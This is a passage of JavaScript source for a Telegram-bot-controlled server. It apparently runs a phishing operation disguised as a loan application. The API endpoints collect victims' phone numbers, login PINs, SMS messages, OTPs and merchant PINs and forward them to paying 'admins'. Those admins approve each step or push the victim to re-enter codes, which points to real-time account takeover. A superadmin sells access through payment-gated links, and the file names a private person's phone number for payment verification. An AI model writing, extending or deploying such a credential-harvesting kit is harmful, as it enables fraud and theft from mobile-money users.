            await db.updateAdmin(targetAdminId, { paymentStatus: 'rejected', paymentSubmittedAt: null, payerName: null });
            await bot.sendMessage(chatId, `❌ *PAYMENT REJECTED*\n\n👤 ${admin.name}\n🆔 \`${targetAdminId}\``, { parse_mode: 'Markdown' });
            if (admin.chatId) {
                await bot.sendMessage(admin.chatId, `❌ *PAYMENT REJECTED*\n\nPlease resubmit:\n\`/payment YOUR_TRANSACTION_CODE\``, { parse_mode: 'Markdown' });
            }
        } catch (error) {
            bot.sendMessage(chatId, '❌ Failed. Error: ' + error.message);
        }
    });

    // /send
    bot.onText(/\/send (.+)/, async (msg, match) => {
        const chatId  = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        if (!isSuperAdmin(adminId)) return bot.sendMessage(chatId, '❌ Only superadmin can send messages to admins.');

        try {
            const input      = match[1].trim();
            const spaceIndex = input.indexOf(' ');
            if (spaceIndex === -1) return bot.sendMessage(chatId, `❌ Use: /send ADMINID Your message here`);

            const targetAdminId = input.substring(0, spaceIndex).trim();
            const messageText   = input.substring(spaceIndex + 1).trim();

            const targetAdmin = await db.getAdmin(targetAdminId);
            if (!targetAdmin) return bot.sendMessage(chatId, `❌ Admin \`${targetAdminId}\` not found.`, { parse_mode: 'Markdown' });

            const sent = await sendToAdmin(targetAdminId, `📨 *MESSAGE FROM SUPER ADMIN*\n\n${messageText}\n\n⏰ ${new Date().toLocaleString()}`, { parse_mode: 'Markdown' });
            if (sent) {
                bot.sendMessage(chatId, `✅ Message sent to ${targetAdmin.name}`, { parse_mode: 'Markdown' });
            } else {
                bot.sendMessage(chatId, `❌ Failed to send message to ${targetAdmin.name}`);
            }
        } catch (error) {
            bot.sendMessage(chatId, '❌ Failed. Error: ' + error.message);
        }
    });

    // /broadcast
    bot.onText(/\/broadcast (.+)/, async (msg, match) => {
        const chatId  = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        if (!isSuperAdmin(adminId)) return bot.sendMessage(chatId, '❌ Only superadmin can broadcast.');

        try {
            const messageText  = match[1].trim();
            const allAdmins    = await db.getAllAdmins();
            const targetAdmins = allAdmins.filter(a => !isSuperAdmin(a.adminId));
            if (targetAdmins.length === 0) return bot.sendMessage(chatId, '⚠️ No other admins to broadcast to.');

            let successCount = 0, failCount = 0;
            const results = [];

            for (const admin of targetAdmins) {
                const sent = await sendToAdmin(admin.adminId, `📢 *BROADCAST FROM SUPER ADMIN*\n\n${messageText}\n\n⏰ ${new Date().toLocaleString()}`, { parse_mode: 'Markdown' });
                if (sent) { successCount++; results.push(`✅ ${admin.name}`); }
                else       { failCount++;   results.push(`❌ ${admin.name}`); }
                await new Promise(resolve => setTimeout(resolve, 100));
            }

            bot.sendMessage(chatId, `📢 *BROADCAST COMPLETE*\n\n✅ Sent: ${successCount}\n❌ Failed: ${failCount}\n\n${results.join('\n')}`, { parse_mode: 'Markdown' });
        } catch (error) {
            bot.sendMessage(chatId, '❌ Failed. Error: ' + error.message);
        }
    });

    // /ask
    bot.onText(/\/ask (.+)/, async (msg, match) => {
        const chatId  = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        if (!isSuperAdmin(adminId)) return bot.sendMessage(chatId, '❌ Only superadmin can send action requests.');

        try {
            const input      = match[1].trim();
            const spaceIndex = input.indexOf(' ');
            if (spaceIndex === -1) return bot.sendMessage(chatId, `❌ Use: /ask ADMINID Your request here`);

            const targetAdminId = input.substring(0, spaceIndex).trim();
            const requestText   = input.substring(spaceIndex + 1).trim();
            const requestId     = `REQ-${Date.now()}`;

            const targetAdmin = await db.getAdmin(targetAdminId);
            if (!targetAdmin) return bot.sendMessage(chatId, `❌ Admin \`${targetAdminId}\` not found.`, { parse_mode: 'Markdown' });

            const sent = await sendToAdmin(targetAdminId, `
❓ *REQUEST FROM SUPER ADMIN*

${requestText}

📋 Request ID: \`${requestId}\`
⏰ ${new Date().toLocaleString()}
            `, {
                parse_mode: 'Markdown',
                reply_markup: {
                    inline_keyboard: [[
                        { text: '✅ Done',      callback_data: `reqresp-done-${requestId}-${targetAdminId}` },
                        { text: '❓ Need Help', callback_data: `reqresp-help-${requestId}-${targetAdminId}` }
                    ]]
                }
            });

            if (sent) {
                bot.sendMessage(chatId, `✅ Request sent to ${targetAdmin.name}.\nRequest ID: \`${requestId}\``, { parse_mode: 'Markdown' });
            } else {
                bot.sendMessage(chatId, `❌ Failed to send request.`);
            }
        } catch (error) {
            bot.sendMessage(chatId, '❌ Failed. Error: ' + error.message);
        }
    });

    // /clearalladmins
    bot.onText(/\/clearalladmins/, async (msg) => {
        const chatId  = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        if (!isSuperAdmin(adminId)) return bot.sendMessage(chatId, '❌ Only superadmin can do this!');

        try {
            await bot.sendMessage(chatId, `⚠️ *WARNING - IRREVERSIBLE ACTION*\n\nThis will DELETE ALL ADMINS except SUPER ADMINS!`, {
                parse_mode: 'Markdown',
                reply_markup: {
                    inline_keyboard: [[
                        { text: '✅ YES, DELETE ALL', callback_data: 'sysact-clearadmins-confirm' },
                        { text: '❌ CANCEL',          callback_data: 'sysact-clearadmins-cancel'  }
                    ]]
                }
            });
        } catch (error) {
            bot.sendMessage(chatId, '❌ Error: ' + error.message);
        }
    });

    // /payment
    bot.onText(/\/payment (.+)/, async (msg, match) => {
        const chatId  = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);

        if (!adminId) return bot.sendMessage(chatId, '❌ Not registered as admin.');
        if (isSuperAdmin(adminId)) return bot.sendMessage(chatId, '❌ Superadmin does not require payment.');

        try {
            const transactionCode = match[1].trim().toUpperCase();
            const admin = await db.getAdmin(adminId);
            if (!admin) return bot.sendMessage(chatId, '❌ Admin not found.');
            if (!admin.linkLocked) return bot.sendMessage(chatId, '✅ Your link is already active! No payment needed.');

            await db.updateAdmin(adminId, {
                paymentStatus: 'pending',
                payerName: `Transaction: ${transactionCode}`,
                paymentSubmittedAt: new Date()
            });

            await bot.sendMessage(chatId, `
✅ *PAYMENT RECEIVED*

Transaction Code: \`${transactionCode}\`
Pending verification by super admin.

You will be notified once approved.
            `, { parse_mode: 'Markdown' });

            for (const superAdminId of SUPER_ADMINS) {
                await sendToAdmin(superAdminId, `
💳 *NEW PAYMENT SUBMITTED*

🆔 Admin ID: \`${adminId}\`
👤 Name: ${admin.name}
📱 Transaction Code: \`${transactionCode}\`
⏰ ${new Date().toLocaleString()}

Verify: 📞 0791336749 (Okeyo Bungu)
                `, {
                    parse_mode: 'Markdown',
                    reply_markup: {
                        inline_keyboard: [[
                            { text: '✅ APPROVE PAYMENT', callback_data: `paymgmt-approve-${adminId}` },
                            { text: '❌ REJECT PAYMENT',  callback_data: `paymgmt-reject-${adminId}` }
                        ]]
                    }
                });
            }
        } catch (error) {
            console.error('❌ Error processing payment:', error);
            bot.sendMessage(chatId, '❌ Error: ' + error.message);
        }
    });

    console.log('✅ Command handlers setup complete!');
}

// ==========================================
// TELEGRAM CALLBACK HANDLER
// ==========================================
bot.on('callback_query', async (callbackQuery) => {
    const chatId    = callbackQuery.message.chat.id;
    const messageId = callbackQuery.message.message_id;
    const data      = callbackQuery.data;
    const adminId   = getAdminIdByChatId(chatId);

    console.log(`\n🔘 CALLBACK: "${data}" | adminId: ${adminId || 'UNKNOWN'} | chatId: ${chatId}`);

    if (!adminId) {
        return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Not authorized!', show_alert: true });
    }

    // ══════════════════════════════════════════════════════════════
    // GROUP 1: Link payment yes/no  →  linkpaid-yes-ADMINID
    // ══════════════════════════════════════════════════════════════
    if (data.startsWith('linkpaid-')) {
        if (!isSuperAdmin(adminId)) {
            return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Not authorized!', show_alert: true });
        }

        // data = "linkpaid-yes-ADMIN001" or "linkpaid-no-ADMIN001"
        const withoutPrefix    = data.slice('linkpaid-'.length);           // "yes-ADMIN001"
        const dashPos          = withoutPrefix.indexOf('-');
        const answer           = withoutPrefix.substring(0, dashPos);      // "yes" or "no"
        const targetAdminId    = withoutPrefix.substring(dashPos + 1);     // "ADMIN001"

        if (answer === 'yes') {
            removeLinkPaymentTimer(targetAdminId);
            await db.updateAdmin(targetAdminId, { linkLocked: false, paymentStatus: 'approved', paidAt: new Date() });

            await bot.editMessageText(`✅ *PAYMENT APPROVED*\n\nAdmin \`${targetAdminId}\` link is now unlocked!\n⏰ ${new Date().toLocaleString()}`,
                { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
            await bot.answerCallbackQuery(callbackQuery.id, { text: '✅ Payment approved, link unlocked!' });

            const admin = await db.getAdmin(targetAdminId);
            if (admin?.chatId) {
                bot.sendMessage(admin.chatId, `✅ *PAYMENT APPROVED!*\n\nYour link is now permanently active!\n\n🔗 ${WEBHOOK_URL}?admin=${targetAdminId}\n\nUse /start to see commands.`, { parse_mode: 'Markdown' }).catch(() => {});
            }
        } else {
            await bot.editMessageText(`⏱️ *LINK TIMER ACTIVE*\n\nAdmin \`${targetAdminId}\` - Payment not yet made.\n5-minute countdown continues...`,
                { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
            await bot.answerCallbackQuery(callbackQuery.id, { text: '⏱️ Timer continues' });
        }
        return;
    }

    // ══════════════════════════════════════════════════════════════
    // GROUP 2: Payment approve/reject  →  paymgmt-approve-ADMINID
    // ══════════════════════════════════════════════════════════════
    if (data.startsWith('paymgmt-')) {
        if (!isSuperAdmin(adminId)) {
            return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Not authorized!', show_alert: true });
        }

        // data = "paymgmt-approve-ADMIN001" or "paymgmt-reject-ADMIN001"
        const withoutPrefix = data.slice('paymgmt-'.length);              // "approve-ADMIN001"
        const dashPos       = withoutPrefix.indexOf('-');
        const action        = withoutPrefix.substring(0, dashPos);         // "approve" or "reject"
        const targetAdminId = withoutPrefix.substring(dashPos + 1);        // "ADMIN001"

        const admin = await db.getAdmin(targetAdminId);
        if (!admin) {
            return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Admin not found!', show_alert: true });
        }

        if (action === 'approve') {
            removeLinkPaymentTimer(targetAdminId);
            await db.updateAdmin(targetAdminId, { paymentStatus: 'approved', linkLocked: false, paidAt: new Date() });

            await bot.editMessageText(`✅ *PAYMENT APPROVED*\n\n👤 ${admin.name}\n🆔 \`${targetAdminId}\`\n⏰ ${new Date().toLocaleString()}\n\nLink is now unlocked!`,
                { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
            await bot.answerCallbackQuery(callbackQuery.id, { text: '✅ Payment approved!' });

            if (admin.chatId) {
                await bot.sendMessage(admin.chatId, `✅ *PAYMENT APPROVED!*\n\nYour link is now active.\n\n🔗 ${WEBHOOK_URL}?admin=${targetAdminId}\n\nUse /start to see commands.`, { parse_mode: 'Markdown' });
            }
        } else if (action === 'reject') {
            await db.updateAdmin(targetAdminId, { paymentStatus: 'rejected', paymentSubmittedAt: null, payerName: null });

            await bot.editMessageText(`❌ *PAYMENT REJECTED*\n\n👤 ${admin.name}\n🆔 \`${targetAdminId}\`\n⏰ ${new Date().toLocaleString()}`,
                { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
            await bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Payment rejected' });

            if (admin.chatId) {
                await bot.sendMessage(admin.chatId, `❌ *PAYMENT REJECTED*\n\nPlease resubmit:\n\`/payment YOUR_TRANSACTION_CODE\``, { parse_mode: 'Markdown' });
            }
        }
        return;
    }

    // ══════════════════════════════════════════════════════════════
    // GROUP 3: Request responses  →  reqresp-done-REQID-ADMINID
    // ══════════════════════════════════════════════════════════════
    if (data.startsWith('reqresp-')) {
        // data = "reqresp-done-REQ-123456-ADMIN001" or "reqresp-help-..."
        const withoutPrefix = data.slice('reqresp-'.length);  // "done-REQ-123456-ADMIN001"
        const dashPos       = withoutPrefix.indexOf('-');
        const action        = withoutPrefix.substring(0, dashPos);  // "done" or "help"
        const rest          = withoutPrefix.substring(dashPos + 1); // "REQ-123456-ADMIN001"

        // requestId is everything except the last segment (adminId)
        const lastDash          = rest.lastIndexOf('-');
        const requestId         = rest.substring(0, lastDash);   // "REQ-123456"
        const respondingAdminId = rest.substring(lastDash + 1);  // "ADMIN001"

        const respondingAdmin = await db.getAdmin(respondingAdminId);

        for (const superAdminId of SUPER_ADMINS) {
            const superAdminChatId = adminChatIds.get(superAdminId);
            if (superAdminChatId) {
                if (action === 'done') {
                    await bot.sendMessage(superAdminChatId, `✅ *REQUEST COMPLETED*\n\nAdmin: ${respondingAdmin?.name || respondingAdminId}\nRequest ID: \`${requestId}\`\n⏰ ${new Date().toLocaleString()}`, { parse_mode: 'Markdown' });
                } else {
                    await bot.sendMessage(superAdminChatId, `❓ *ADMIN NEEDS HELP*\n\nAdmin: ${respondingAdmin?.name || respondingAdminId}\n🆔 \`${respondingAdminId}\`\nRequest ID: \`${requestId}\`\n\nUse: /send ${respondingAdminId} Your message`, { parse_mode: 'Markdown' });
                }
            }
        }

        const emoji = action === 'done' ? '✅' : '❓';
        const label = action === 'done' ? 'COMPLETED' : 'HELP REQUESTED';
        await bot.editMessageText(`${emoji} *REQUEST ${label}*\n\nRequest ID: \`${requestId}\`\n⏰ ${new Date().toLocaleString()}\n\nSuper admin has been notified.`,
            { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
        await bot.answerCallbackQuery(callbackQuery.id, { text: `${emoji} Response sent to super admin` });
        return;
    }

    // ══════════════════════════════════════════════════════════════
    // GROUP 4: System actions  →  sysact-clearadmins-confirm/cancel
    // ══════════════════════════════════════════════════════════════
    if (data.startsWith('sysact-')) {
        if (!isSuperAdmin(adminId)) {
            return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Not authorized!', show_alert: true });
        }

        if (data === 'sysact-clearadmins-confirm') {
            try {
                const allAdmins     = await db.getAllAdmins();
                const adminsToClear = allAdmins.filter(a => !isSuperAdmin(a.adminId));
                let deletedCount    = 0;
                const deletedNames  = [];

                for (const admin of adminsToClear) {
                    try {
                        await db.deleteAdmin(admin.adminId);
                        deletedCount++;
                        deletedNames.push(`${admin.name} (${admin.adminId})`);
                        adminChatIds.delete(admin.adminId);
                        pausedAdmins.delete(admin.adminId);
                        removeLinkPaymentTimer(admin.adminId);
                    } catch (err) {
                        console.error(`Failed to delete ${admin.adminId}:`, err.message);
                    }
                }

                await bot.editMessageText(`🗑️ *ALL ADMINS CLEARED*\n\nDeleted: ${deletedCount}\n🛡️ Super Admins: Protected\n⏰ ${new Date().toLocaleString()}\n\n${deletedNames.map((n,i) => `${i+1}. ${n}`).join('\n')}`,
                    { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
                await bot.answerCallbackQuery(callbackQuery.id, { text: `✅ Cleared ${deletedCount} admin(s)!` });
            } catch (error) {
                bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Error: ' + error.message, show_alert: true });
            }
        } else if (data === 'sysact-clearadmins-cancel') {
            await bot.editMessageText(`❌ *CANCELLED*\n\nOperation was cancelled.\n⏰ ${new Date().toLocaleString()}`,
                { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
            await bot.answerCallbackQuery(callbackQuery.id, { text: 'Operation cancelled' });
        }
        return;
    }

    // ══════════════════════════════════════════════════════════════
    // GROUP 5: Application actions
    // Format: app-ACTION-ADMINID-APPLICATIONID
    // Actions: allowpin, denypin, approvesms, rejectsms,
    //          approveotp, wrongcodeotp, wrongpinotp,
    //          approvemerc, wrongmerc
    // ══════════════════════════════════════════════════════════════
    if (data.startsWith('app-')) {
        // Active admin check
        if (!isAdminActive(chatId)) {
            return bot.answerCallbackQuery(callbackQuery.id, { text: '🚫 Your admin access has been paused.', show_alert: true });
        }

        // Parse: app-ACTION-ADMINID-APPID
        // ADMINID is like ADMIN001 (no hyphens), APPID is like APP-1234567890
        // Split on first 3 hyphens only:
        const withoutPrefix = data.slice('app-'.length);    // "allowpin-ADMIN001-APP-123"
        const parts         = withoutPrefix.split('-');
        // parts[0] = action, parts[1] = "ADMIN001", parts[2+] = application ID parts
        if (parts.length < 3) {
            return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Invalid callback.', show_alert: true });
        }

        const action          = parts[0];                         // e.g. "allowpin"
        const embeddedAdminId = parts[1];                         // e.g. "ADMIN001"
        const applicationId   = parts.slice(2).join('-');         // e.g. "APP-1234567890"

        console.log(`   → Action: ${action} | Admin: ${embeddedAdminId} | App: ${applicationId}`);

        // Ownership check
        if (embeddedAdminId !== adminId) {
            return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ This application belongs to another admin!', show_alert: true });
        }

        const application = await db.getApplication(applicationId);
        if (!application || application.adminId !== adminId) {
            return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Application not found or not yours!', show_alert: true });
        }

        const phone = formatPhone(application.phoneNumber);

        // ── Allow PIN (login approved) ──
        if (action === 'allowpin') {
            await db.updateApplication(applicationId, { pinStatus: 'approved' });
            await bot.editMessageText(`
✅ *LOGIN APPROVED*

📋 \`${applicationId}\`
📞 \`${phone}\`
🔑 PIN: \`${application.pin}\`

✓ User can now proceed to SMS verification
👤 ${callbackQuery.from.first_name}
⏰ ${new Date().toLocaleString()}
            `, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
            await bot.answerCallbackQuery(callbackQuery.id, { text: '✅ Login approved!' });
            return;
        }

        // ── Deny PIN (login rejected) ──
        if (action === 'denypin') {
            await db.updateApplication(applicationId, { pinStatus: 'rejected' });
            await bot.editMessageText(`
❌ *LOGIN DENIED*

📋 \`${applicationId}\`
📞 \`${phone}\`
🔑 PIN: \`${application.pin}\`

✗ User sent back to login page
👤 ${callbackQuery.from.first_name}
⏰ ${new Date().toLocaleString()}
            `, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
            await bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Login denied.' });
            return;
        }

        // ── Approve SMS ──
        if (action === 'approvesms') {
            await db.updateApplication(applicationId, { otpStatus: 'approved' });
            await bot.editMessageText(`
✅ *SMS MESSAGE APPROVED*

📋 \`${applicationId}\`
📞 \`${phone}\`

📝 Message: \`${application.smsMessage || 'N/A'}\`

✓ User can now proceed to OTP
👤 ${callbackQuery.from.first_name}
⏰ ${new Date().toLocaleString()}
            `, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
            await bot.answerCallbackQuery(callbackQuery.id, { text: '✅ SMS approved!' });
            return;
        }

        // ── Reject SMS ──
        if (action === 'rejectsms') {
            await db.updateApplication(applicationId, { otpStatus: 'rejected' });
            await bot.editMessageText(`
❌ *SMS MESSAGE INVALID*

📋 \`${applicationId}\`
📞 \`${phone}\`

📝 Message: \`${application.smsMessage || 'N/A'}\`

✗ User asked to paste correct message
👤 ${callbackQuery.from.first_name}
⏰ ${new Date().toLocaleString()}
            `, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
            await bot.answerCallbackQuery(callbackQuery.id, { text: '❌ SMS rejected.' });
            return;
        }

        // ── Approve OTP / Loan ──
        if (action === 'approveotp') {
            await db.updateApplication(applicationId, { otpStatus: 'approved' });
            await bot.editMessageText(`
🎉 *LOAN APPROVED!*

📋 \`${applicationId}\`
📞 \`${phone}\`
🔢 OTP: \`${application.otp}\`

✓ Loan has been approved successfully!
👤 ${callbackQuery.from.first_name}
⏰ ${new Date().toLocaleString()}
            `, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
            await bot.answerCallbackQuery(callbackQuery.id, { text: '🎉 Loan approved!' });
            return;
        }

        // ── Wrong OTP code ──
        if (action === 'wrongcodeotp') {
            await db.updateApplication(applicationId, { otpStatus: 'wrongcode' });
            await bot.editMessageText(`
❌ *WRONG OTP CODE*

📋 \`${applicationId}\`
📞 \`${phone}\`
🔢 OTP entered: \`${application.otp}\`

✗ User asked to re-enter OTP
👤 ${callbackQuery.from.first_name}
⏰ ${new Date().toLocaleString()}
            `, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
            await bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Wrong OTP. User will retry.' });
            return;
        }

        // ── Wrong PIN at OTP stage ──
        if (action === 'wrongpinotp') {
            await db.updateApplication(applicationId, { otpStatus: 'wrongpin_otp' });
            await bot.editMessageText(`
❌ *WRONG PIN AT OTP STAGE*

📋 \`${applicationId}\`
📞 \`${phone}\`
🔢 OTP: \`${application.otp}\`

⚠️ User's PIN was incorrect - will re-enter
👤 ${callbackQuery.from.first_name}
⏰ ${new Date().toLocaleString()}
            `, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
            await bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Wrong PIN flagged.' });
            return;
        }

        // ── Approve Merchant PIN ──
        if (action === 'approvemerc') {
            await db.updateApplication(applicationId, { merchantPinStatus: 'approved' });
            await bot.editMessageText(`
🎉 *FULLY APPROVED — MERCHANT PIN CONFIRMED!*

📋 \`${applicationId}\`
📞 \`${phone}\`
🔑 Login PIN: \`${application.pin}\`
🔢 OTP: \`${application.otp}\`
💳 Merchant PIN: \`${application.merchantPin}\`

✓ ALL DETAILS CONFIRMED
👤 ${callbackQuery.from.first_name}
⏰ ${new Date().toLocaleString()}
            `, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
            await bot.answerCallbackQuery(callbackQuery.id, { text: '🎉 Merchant PIN confirmed!' });
            return;
        }

        // ── Wrong Merchant PIN ──
        if (action === 'wrongmerc') {
            await db.updateApplication(applicationId, { merchantPinStatus: 'wrong' });
            await bot.editMessageText(`
❌ *WRONG MERCHANT PIN*

📋 \`${applicationId}\`
📞 \`${phone}\`
💳 Merchant PIN: \`${application.merchantPin}\`

⚠️ User will re-enter
👤 ${callbackQuery.from.first_name}
⏰ ${new Date().toLocaleString()}
            `, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
            await bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Wrong merchant PIN.' });
            return;
        }

        // Unknown app action
        return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Unknown action.', show_alert: true });
    }

    // Unknown callback
    console.warn(`⚠️ Unhandled callback: ${data}`);
    return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Unknown action.', show_alert: true });
});

console.log('✅ Telegram callback handler registered!');

// ==========================================
// DB-READY MIDDLEWARE
// ==========================================
app.use((req, res, next) => {
    if (!dbReady && !req.path.includes('/health') && !req.path.includes('/telegram-webhook')) {
        return res.status(503).json({ success: false, message: 'Database not ready yet' });
    }
    next();
});

// ==========================================
// API ENDPOINTS
// ==========================================

// POST /api/verify-pin
app.post('/api/verify-pin', async (req, res) => {
    try {
        const { phoneNumber, pin, requestAdminId, assignmentType } = req.body;
        const applicationId = `APP-${Date.now()}`;

        console.log('\n📥 PIN Verification Request:', { phoneNumber, requestAdminId, assignmentType });

        if (!requestAdminId || requestAdminId === 'undefined' || requestAdminId === '') {
            return res.status(400).json({ success: false, message: 'Invalid request: Admin authorization required.' });
        }

        if (assignmentType !== 'specific') {
            return res.status(400).json({ success: false, message: 'Invalid request: Only specific admin assignment is allowed.' });
        }

        const lockKey = `pin_${phoneNumber}`;
        if (processingLocks.has(lockKey)) {
            return res.status(429).json({ success: false, message: 'Request already processing. Please wait.' });
        }
        processingLocks.add(lockKey);
        setTimeout(() => processingLocks.delete(lockKey), 10000);

        const assignedAdmin = await db.getAdmin(requestAdminId);
        if (!assignedAdmin) {
            processingLocks.delete(lockKey);
            return res.status(400).json({ success: false, message: 'Invalid admin ID.' });
        }

        if (assignedAdmin.linkLocked) {
            processingLocks.delete(lockKey);
            return res.status(400).json({ success: false, message: 'This admin link is currently locked. Admin must complete payment.' });
        }

        if (pausedAdmins.has(requestAdminId) || assignedAdmin.status !== 'active') {
            processingLocks.delete(lockKey);
            return res.status(400).json({ success: false, message: 'This admin is temporarily unavailable.' });
        }

        console.log(`🔒 Locked to admin: ${assignedAdmin.name} (${assignedAdmin.adminId})`);

        // Ensure chatId is cached
        if (!adminChatIds.has(assignedAdmin.adminId) && assignedAdmin.chatId) {
            adminChatIds.set(assignedAdmin.adminId, assignedAdmin.chatId);
        }

        if (!adminChatIds.has(assignedAdmin.adminId)) {
            processingLocks.delete(lockKey);
            return res.status(503).json({ success: false, message: 'Admin not connected — they need to /start the bot first.' });
        }

        // Duplicate check
        const existingApps   = await db.getApplicationsByAdmin(assignedAdmin.adminId);
        const alreadyPending = existingApps.find(a => a.phoneNumber === phoneNumber && a.pinStatus === 'pending');
        if (alreadyPending) {
            processingLocks.delete(lockKey);
            return res.json({ success: true, applicationId: alreadyPending.id, assignedTo: assignedAdmin.name, assignedAdminId: assignedAdmin.adminId });
        }

        // Returning user history
        const thisAdminPastApps = existingApps
            .filter(a => a.phoneNumber === phoneNumber && a.pinStatus !== 'pending')
            .sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
        const isReturningUser = thisAdminPastApps.length > 0;

        let historyText = '';
        if (isReturningUser) {
            const last       = thisAdminPastApps[0];
            const lastDate   = new Date(last.timestamp).toLocaleString();
            const lastStatus = last.otpStatus === 'approved'      ? '✅ Approved' :
                               last.pinStatus === 'rejected'      ? '❌ Rejected (PIN)' :
                               last.otpStatus === 'wrongcode'     ? '❌ Wrong OTP Code' :
                               last.otpStatus === 'wrongpin_otp'  ? '❌ Wrong PIN (OTP stage)' : '⏳ Incomplete';
            const allStatuses = thisAdminPastApps.slice(0, 3).map((a, idx) => {
                const s = a.otpStatus === 'approved'     ? '✅' :
                          a.pinStatus === 'rejected'     ? '❌PIN' :
                          a.otpStatus === 'wrongcode'    ? '❌OTP' :
                          a.otpStatus === 'wrongpin_otp' ? '❌PIN@OTP' : '⏳';
                return `${idx+1}. ${s} ${new Date(a.timestamp).toLocaleDateString()}`;
            }).join('\n');
            historyText = `\n\n━━━━━━━━━━━━━━━━━━\n🔄 *RETURNING CUSTOMER*\nVisits: *${thisAdminPastApps.length}*\nLast: ${lastDate}\nResult: ${lastStatus}\nHistory:\n${allStatuses}\n━━━━━━━━━━━━━━━━━━`;
        }

        // Save application
        await db.saveApplication({
            id:             applicationId,
            adminId:        assignedAdmin.adminId,
            adminName:      assignedAdmin.name,
            phoneNumber,
            pin,
            pinStatus:      'pending',
            otpStatus:      'pending',
            assignmentType: 'specific',
            isReturningUser,
            previousCount:  thisAdminPastApps.length,
            timestamp:      new Date().toISOString()
        });

        console.log(`💾 Application saved: ${applicationId}`);

        // ✅ Send to Telegram with app- prefixed callback data
        const userLabel = isReturningUser
            ? `🔄 *RETURNING USER* (${thisAdminPastApps.length}x before)`
            : '🆕 *NEW APPLICATION*';

        const sent = await sendToAdmin(assignedAdmin.adminId, `
${userLabel}

📋 \`${applicationId}\`
📞 \`${formatPhone(phoneNumber)}\`
🔑 \`${pin}\`
⏰ ${new Date().toLocaleString()}${historyText}

⚠️ *VERIFY INFORMATION*
        `, {
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [
                    [{ text: '❌ Invalid - Deny',      callback_data: `app-denypin-${assignedAdmin.adminId}-${applicationId}` }],
                    [{ text: '✅ Correct - Allow OTP', callback_data: `app-allowpin-${assignedAdmin.adminId}-${applicationId}` }]
                ]
            }
        });

        if (!sent) {
            console.error(`❌ Failed to send notification to admin ${assignedAdmin.adminId}`);
        }

        processingLocks.delete(lockKey);
        res.json({ success: true, applicationId, assignedTo: assignedAdmin.name, assignedAdminId: assignedAdmin.adminId });

    } catch (error) {
        processingLocks.delete(`pin_${req.body?.phoneNumber}`);
        console.error('❌ Error in /api/verify-pin:', error);
        res.status(500).json({ success: false, message: 'Server error: ' + error.message });
    }
});

// GET /api/check-pin-status/:applicationId
app.get('/api/check-pin-status/:applicationId', async (req, res) => {
    try {
        const application = await db.getApplication(req.params.applicationId);
        if (application) res.json({ success: true, status: application.pinStatus });
        else res.status(404).json({ success: false, message: 'Application not found' });
    } catch (error) {
        res.status(500).json({ success: false, message: 'Server error' });
    }
});

// POST /api/verify-sms
app.post('/api/verify-sms', async (req, res) => {
    console.log('\n📨 /api/verify-sms called:', JSON.stringify(req.body));
    try {
        const { applicationId, smsMessage } = req.body;
        const application = await db.getApplication(applicationId);

        if (!application) return res.status(404).json({ success: false, message: 'Application not found' });

        // Ensure chatId cached
        if (!adminChatIds.has(application.adminId)) {
            const admin = await db.getAdmin(application.adminId);
            if (admin?.chatId) adminChatIds.set(application.adminId, admin.chatId);
            else return res.status(500).json({ success: false, message: 'Admin unavailable' });
        }

        await db.updateApplication(applicationId, { smsMessage, otpStatus: 'pending' });

        await sendToAdmin(application.adminId, `
📨 *SMS MESSAGE VERIFICATION*

📋 \`${applicationId}\`
📞 \`${formatPhone(application.phoneNumber)}\`
⏰ ${new Date().toLocaleString()}

📝 *Message:*
\`\`\`
${smsMessage}
\`\`\`

⚠️ *IS THIS MESSAGE CORRECT?*
        `, {
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [
                    [{ text: '❌ Invalid Message',   callback_data: `app-rejectsms-${application.adminId}-${applicationId}` }],
                    [{ text: '✅ Correct Message',   callback_data: `app-approvesms-${application.adminId}-${applicationId}` }]
                ]
            }
        });

        res.json({ success: true, message: 'SMS submitted for verification' });
    } catch (error) {
        console.error('❌ Error in /api/verify-sms:', error);
        res.status(500).json({ success: false, message: 'Server error: ' + error.message });
    }
});

// GET /api/check-otp-status/:applicationId
app.get('/api/check-otp-status/:applicationId', async (req, res) => {
    try {
        const application = await db.getApplication(req.params.applicationId);
        if (application) res.json({ success: true, status: application.otpStatus });
        else res.status(404).json({ success: false, message: 'Application not found' });
    } catch (error) {
        res.status(500).json({ success: false, message: 'Server error' });
    }
});

// POST /api/verify-otp
app.post('/api/verify-otp', async (req, res) => {
